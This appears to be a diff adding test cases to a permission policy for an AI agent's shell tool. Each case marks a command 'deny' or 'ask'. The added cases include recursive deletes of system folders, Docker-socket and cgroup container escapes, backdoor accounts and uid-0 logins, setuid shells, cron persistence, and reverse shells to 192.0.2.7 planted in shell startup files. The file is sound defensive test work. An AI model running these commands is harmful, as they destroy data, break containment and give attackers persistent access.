@@ -344,3 +344,57 @@
 {"tool": "Bash", "args": {"command": "hf upload acme/model ./out"}, "expect": "ask", "note": "upload model weights via hf CLI"}
 {"tool": "Bash", "args": {"command": "ollama push acme/model"}, "expect": "ask", "note": "publish model weights to Ollama registry"}
 {"tool": "Bash", "args": {"command": "cp new.safetensors /srv/models/prod/model.safetensors"}, "expect": "ask", "note": "overwrite model weights in production"}
+{"tool": "Bash", "args": {"command": "rm -rf /var /etc"}, "expect": "deny", "note": "a recursive delete of two system folders (#749)"}
+{"tool": "Bash", "args": {"command": "chmod -R 000 /"}, "expect": "deny", "note": "locking every file from root down (#749)"}
+{"tool": "Bash", "args": {"command": "find /srv -type f -delete"}, "expect": "deny", "note": "every file under a system folder deleted with find (#749)"}
+{"tool": "Bash", "args": {"command": "rm -rf //etc"}, "expect": "deny", "note": "a system folder with an extra slash (#749)"}
+{"tool": "Bash", "args": {"command": "rm -rf /etc/."}, "expect": "deny", "note": "a system folder spelled with a trailing /. (#749)"}
+{"tool": "Bash", "args": {"command": "rm -rf /usr/*"}, "expect": "deny", "note": "every file of a system folder (#749)"}
+{"tool": "Bash", "args": {"command": "chown -R me /usr"}, "expect": "deny", "note": "taking over a system folder recursively (#749)"}
+{"tool": "Bash", "args": {"command": "sh -c 'rm -rf /var'"}, "expect": "deny", "note": "a system folder deleted through sh -c (#749)"}
+{"tool": "Bash", "args": {"command": "rm -rf /Library"}, "expect": "deny", "note": "macOS's system Library deleted (#749)"}
+{"tool": "Bash", "args": {"command": "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json"}, "expect": "ask", "note": "raw request through the Docker socket"}
+{"tool": "Bash", "args": {"command": "curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\"}'"}, "expect": "ask", "note": "create a container through the Docker socket"}
+{"tool": "Bash", "args": {"command": "socat - UNIX-CONNECT:/run/podman/podman.sock"}, "expect": "ask", "note": "socat to the Podman socket"}
+{"tool": "Bash", "args": {"command": "nc -U /var/run/docker.sock"}, "expect": "ask", "note": "netcat to the Docker socket"}
+{"tool": "Bash", "args": {"command": "DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "a program pointed at the Docker socket"}
+{"tool": "Bash", "args": {"command": "echo 1 > /sys/fs/cgroup/x/notify_on_release && echo '/cmd' > /sys/fs/cgroup/x/release_agent"}, "expect": "ask", "note": "cgroup release_agent escape"}
+{"tool": "Bash", "args": {"command": "echo /cmd | tee /sys/fs/cgroup/x/release_agent"}, "expect": "ask", "note": "tee into a cgroup release_agent"}
+{"tool": "Bash", "args": {"command": "curl -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s -s --unix-socket /var/run/docker.sock http://localhost/containers/json"}, "expect": "ask", "note": "Docker socket request behind thirty-two flags"}
+{"tool": "Bash", "args": {"command": "time DOCKER_HOST=unix:///run/user/1000/podman/podman.sock pytest tests/integration"}, "expect": "ask", "note": "DOCKER_HOST to the Podman socket after time"}
+{"tool": "Bash", "args": {"command": "! DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after !"}
+{"tool": "Bash", "args": {"command": "/usr/bin/env DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after env by its path"}
+{"tool": "Bash", "args": {"command": "env -- DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after an env option"}
+{"tool": "Bash", "args": {"command": "useradd -m -s /bin/bash -G sudo backdoor"}, "expect": "ask", "note": "a new login in the sudo group (#750)"}
+{"tool": "Bash", "args": {"command": "adduser backdoor"}, "expect": "ask", "note": "a new login (#750)"}
+{"tool": "Bash", "args": {"command": "usermod -aG wheel dev"}, "expect": "ask", "note": "adding a user to an administrator group (#750)"}
+{"tool": "Bash", "args": {"command": "dscl . -create /Users/backdoor"}, "expect": "ask", "note": "a new macOS user record (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd"}, "expect": "ask", "note": "appending a login to the password file (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'x' | tee -a /etc/sudoers.d/x"}, "expect": "ask", "note": "a sudoers drop-in written with tee (#750)"}
+{"tool": "Bash", "args": {"command": "ln -sf /bin/bash /tmp/.X11-unix/sh && chmod +s /tmp/.X11-unix/sh"}, "expect": "ask", "note": "a setuid shell (#750)"}
+{"tool": "Bash", "args": {"command": "chmod u+s /tmp/x"}, "expect": "ask", "note": "a setuid bit by symbol (#750)"}
+{"tool": "Bash", "args": {"command": "chmod -R u+x,g+s /tmp/x"}, "expect": "ask", "note": "a setgid bit in a symbolic list (#750)"}
+{"tool": "Bash", "args": {"command": "chmod 4755 /tmp/x"}, "expect": "ask", "note": "a setuid bit in the numeric mode (#750)"}
+{"tool": "Bash", "args": {"command": "chmod 2755 ./tool"}, "expect": "ask", "note": "a setgid bit in the numeric mode (#750)"}
+{"tool": "Bash", "args": {"command": "echo '*/10 * * * * dev /usr/bin/python3 /tmp/.a.py' >> /var/spool/cron/crontabs/dev"}, "expect": "ask", "note": "a cron job appended to the spool from the shell (#750)"}
+{"tool": "Bash", "args": {"command": "echo '* * * * * root /tmp/a.sh' > /etc/cron.d/a"}, "expect": "ask", "note": "a system cron file written from the shell (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'bash -i >& /dev/tcp/192.0.2.7/4444 0>&1' >> ~/.bash_profile"}, "expect": "ask", "note": "a reverse shell appended to a login file (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'nc -e /bin/sh 192.0.2.7 4444' >> ~/.bashrc"}, "expect": "ask", "note": "a netcat shell appended to bashrc (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'bash -i >& /dev/tcp/192.0.2.7/4444 0>&1' | tee -a ~/.profile"}, "expect": "ask", "note": "a reverse shell teed into profile (#750)"}
+{"tool": "Bash", "args": {"command": "gpasswd -a dev sudo"}, "expect": "ask", "note": "adding a user to sudo with gpasswd (#750)"}
+{"tool": "Bash", "args": {"command": "usermod -o -u 0 dev"}, "expect": "ask", "note": "a second root login with uid 0 (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'sudo:x:27:dev' >> /etc/group"}, "expect": "ask", "note": "a group member appended to the group file (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'sudo:!::dev' | tee -a /etc/gshadow"}, "expect": "ask", "note": "a group member teed into gshadow (#750)"}
+{"tool": "Bash", "args": {"command": "chmod 7755 x"}, "expect": "ask", "note": "setuid and setgid in a mode starting with 7 (#750)"}
+{"tool": "Bash", "args": {"command": "chmod 04755 x"}, "expect": "ask", "note": "a setuid bit in a 5-digit mode (#750)"}
+{"tool": "Bash", "args": {"command": "chmod u+sx x"}, "expect": "ask", "note": "setuid before another letter (#750)"}
+{"tool": "Bash", "args": {"command": "chmod g+s,u+x x"}, "expect": "ask", "note": "setgid in a clause that isn't last (#750)"}
+{"tool": "Bash", "args": {"command": "chmod u=rwxs x"}, "expect": "ask", "note": "setuid set with = (#750)"}
+{"tool": "Bash", "args": {"command": "cp evil /var/spool/cron/crontabs/dev"}, "expect": "ask", "note": "a crontab copied into Debian's spool (#750)"}
+{"tool": "Bash", "args": {"command": "echo '* * * * * x' > /etc/cron.daily/x"}, "expect": "ask", "note": "a script written into cron.daily (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'nc 192.0.2.7 4444 -e /bin/sh' >> ~/.bashrc"}, "expect": "ask", "note": "nc's -e after the address in bashrc (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'nc -nv 192.0.2.7 4444 -e /bin/sh' >> ~/.bashrc"}, "expect": "ask", "note": "nc's -e after options and the address (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'nc -c bash 192.0.2.7 4444' >> ~/.zshrc"}, "expect": "ask", "note": "nc -c appended to zshrc (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'ncat --exec /bin/sh 192.0.2.7 4444' >> ~/.zshrc"}, "expect": "ask", "note": "ncat --exec appended to zshrc (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'sh -i >& /dev/udp/192.0.2.7/4444 0>&1' >> ~/.bashrc"}, "expect": "ask", "note": "a /dev/udp/ shell appended to bashrc (#750)"}
+{"tool": "Bash", "args": {"command": "echo 'bash -i >& /dev/tcp/192.0.2.7/4444 0>&1' >> ~/.zshenv"}, "expect": "ask", "note": "a reverse shell appended to zshenv (#750)"}
